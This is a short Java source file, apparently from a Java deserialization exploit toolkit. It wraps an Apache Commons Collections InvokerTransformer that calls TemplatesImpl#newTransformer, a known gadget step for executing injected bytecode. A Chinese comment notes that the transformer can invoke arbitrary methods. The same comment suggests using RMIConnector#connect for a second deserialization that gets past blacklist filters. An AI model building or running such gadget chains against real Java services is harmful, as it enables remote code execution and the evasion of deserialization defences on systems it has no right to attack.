package transformer;

import org.apache.commons.collections.functors.InvokerTransformer;
import templates.TemplatesGenerator;
/*
可以调用任意类的任意方法，任意参数。触发条件是
InvokerTransformer.transform(templates)
也就是要    可控.transform(可控)
这里调用的是templates#newTransformer
另外还可以调用
javax.management.remote.rmi.RMIConnector#connect
来二次反序列化，这样可以突破黑名单限制
 */

public class Invoker {
    public static InvokerTransformer getInvokerTransformer() throws Exception{
        return new InvokerTransformer(
                "newTransformer",new Class[]{},new Object[]{});
    }

    public static void main(String[] args) throws Exception {
        getInvokerTransformer().transform(TemplatesGenerator.getTemplatesImpl());
    }
}
